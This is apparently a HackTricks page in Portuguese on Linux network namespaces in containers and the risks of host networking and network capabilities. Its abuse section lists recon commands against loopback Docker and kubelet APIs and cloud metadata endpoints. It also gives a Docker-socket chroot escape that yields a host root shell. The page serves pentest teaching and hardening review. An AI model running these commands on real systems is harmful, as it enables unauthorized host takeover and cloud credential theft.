# Namespace de Rede

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão Geral

O namespace de rede isola recursos relacionados à rede, como interfaces, endereços IP, tabelas de roteamento, estado ARP/neighbor, regras de firewall, sockets e o conteúdo de arquivos como `/proc/net`. É por isso que um container pode ter o que parece ser seu próprio `eth0`, suas próprias rotas locais e seu próprio dispositivo loopback sem possuir a pilha de rede real do host.

Do ponto de vista de segurança, isso é importante porque o isolamento de rede envolve muito mais do que port binding. Um namespace de rede privado limita o que o workload pode observar ou reconfigurar diretamente. Uma vez que esse namespace é compartilhado com o host, o container pode subitamente ganhar visibilidade sobre host listeners, host-local services e pontos de controle de rede que nunca deveriam ser expostos à aplicação.

## Operação

Um namespace de rede recém-criado começa com um ambiente de rede vazio ou quase vazio até que interfaces sejam anexadas a ele. Container runtimes então criam ou conectam interfaces virtuais, atribuem endereços e configuram rotas para que o workload tenha a conectividade esperada. Em implantações baseadas em bridge, isso geralmente significa que o container vê uma interface suportada por veth conectada a uma bridge do host. No Kubernetes, plugins CNI cuidam da configuração equivalente para a rede de Pods.

Essa arquitetura explica por que `--network=host` ou `hostNetwork: true` representam uma mudança tão drástica. Em vez de receber uma pilha de rede privada preparada, o workload passa a usar a pilha real do host.

## Laboratório

Você pode ver um namespace de rede quase vazio com:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E você pode comparar containers normais e containers com rede do host com:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
O container com rede do host não tem mais sua própria visão isolada de sockets e interfaces. Essa mudança por si só já é significativa antes mesmo de você perguntar quais capacidades o processo possui.

## Runtime Usage

Docker e Podman normalmente criam um namespace de rede privado para cada container, a menos que configurados de outra forma. Kubernetes normalmente dá a cada Pod seu próprio namespace de rede, compartilhado entre os containers dentro desse Pod, mas separado do host. Sistemas Incus/LXC também fornecem isolamento rico baseado em namespaces de rede, frequentemente com uma variedade maior de configurações de networking virtual.

O princípio comum é que networking privado é a fronteira de isolamento padrão, enquanto usar a rede do host é uma saída explícita dessa fronteira.

## Misconfigurations

A misconfiguração mais importante é simplesmente compartilhar o namespace de rede do host. Isso às vezes é feito por desempenho, monitoramento em baixo nível ou conveniência, mas remove uma das fronteiras mais limpas disponíveis para containers. Listeners locais do host passam a ser alcançáveis de forma mais direta, serviços acessíveis apenas via localhost podem ficar expostos, e capacidades como `CAP_NET_ADMIN` ou `CAP_NET_RAW` tornam-se muito mais perigosas porque as operações que elas habilitam agora são aplicadas ao próprio ambiente de rede do host.

Outro problema é conceder em excesso capabilities relacionadas à rede mesmo quando o namespace de rede é privado. Um namespace privado ajuda, mas não torna sockets raw ou controle avançado de rede inofensivos.

No Kubernetes, `hostNetwork: true` também muda o quanto você pode confiar na segmentação de rede a nível de Pod. A documentação do Kubernetes indica que muitos plugins de rede não conseguem distinguir corretamente o tráfego de Pods com `hostNetwork` para o matching de `podSelector` / `namespaceSelector` e, portanto, o tratam como tráfego ordinário do node. Do ponto de vista de um atacante, isso significa que uma workload comprometida com `hostNetwork` deve frequentemente ser tratada como um ponto de apoio de rede a nível de node, em vez de um Pod normal ainda restringido pelas mesmas suposições de política que workloads em overlay-network.

## Abuse

Em ambientes com isolamento fraco, atacantes podem inspecionar serviços escutando no host, alcançar endpoints de gerenciamento vinculados apenas ao loopback, capturar ou interferir com tráfego dependendo das capacidades e do ambiente exatos, ou reconfigurar rotas e o estado do firewall se `CAP_NET_ADMIN` estiver presente. Em um cluster, isso também pode facilitar movimento lateral e reconhecimento do plano de controle.

Se você suspeita que a rede do host está sendo usada, comece confirmando que as interfaces e listeners visíveis pertencem ao host em vez de a uma rede isolada de container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Serviços acessíveis apenas via loopback costumam ser a primeira descoberta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se capacidades de rede estiverem presentes, teste se a carga de trabalho pode inspecionar ou alterar a pilha visível:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Em kernels modernos, a rede do host mais `CAP_NET_ADMIN` também pode expor o caminho dos pacotes além de simples alterações em `iptables` / `nftables`. `tc` qdiscs e filtros também têm escopo por namespace, então em um namespace de rede do host compartilhado eles se aplicam às interfaces do host que o container pode ver. Se `CAP_BPF` estiver presente adicionalmente, programas eBPF relacionados à rede, como TC e XDP loaders, também se tornam relevantes:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Isso importa porque um atacante pode ser capaz de espelhar, redirecionar, condicionar (shape) ou descartar tráfego ao nível da interface do host, não apenas reescrever regras de firewall. Em um network namespace privado essas ações ficam contidas à visão do container; em um shared host namespace elas passam a impactar o host.

Em ambientes de cluster ou cloud, host networking também justifica uma rápida recon local de metadata e de serviços adjacentes ao control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Exemplo Completo: Host Networking + Local Runtime / Acesso ao Kubelet

Host networking não fornece automaticamente host root, mas frequentemente expõe serviços que são intencionalmente alcançáveis apenas a partir do próprio nó. Se um desses serviços estiver mal protegido, host networking torna-se um caminho direto de privilege-escalation.

Docker API no localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet no localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- comprometimento direto do host se uma API de runtime local estiver exposta sem proteção adequada
- reconhecimento do cluster ou movimento lateral se o kubelet ou agentes locais forem alcançáveis
- manipulação de tráfego ou negação de serviço quando combinado com `CAP_NET_ADMIN`

## Verificações

O objetivo destas verificações é descobrir se o processo possui uma pilha de rede privada, quais rotas e listeners são visíveis, e se a visão de rede já se parece com a do host antes mesmo de testar capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
O que é interessante aqui:

- Se `/proc/self/ns/net` e `/proc/1/ns/net` já aparentam ser do host, o container pode estar compartilhando o network namespace do host ou outro namespace não-privado.
- `lsns -t net` e `ip netns identify` são úteis quando o shell já está dentro de um namespace nomeado ou persistente e você quer correlacioná-lo com objetos em `/run/netns` a partir do lado do host.
- `ss -lntup` é especialmente valioso porque revela sockets de escuta apenas no loopback e endpoints locais de gerenciamento.
- Rotas, nomes de interfaces, contexto do firewall, estado do `tc` e anexos eBPF tornam-se muito mais importantes se `CAP_NET_ADMIN`, `CAP_NET_RAW` ou `CAP_BPF` estiverem presentes.
- No Kubernetes, falha na resolução de service-name de um Pod com `hostNetwork` pode simplesmente significar que o Pod não está usando `dnsPolicy: ClusterFirstWithHostNet`, e não que o serviço esteja ausente.

Ao revisar um container, sempre avalie o network namespace juntamente com o conjunto de capabilities. Host networking combinado com capacidades de rede fortes é uma postura muito diferente de bridge networking combinado com um conjunto de capabilities padrão mais restrito.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
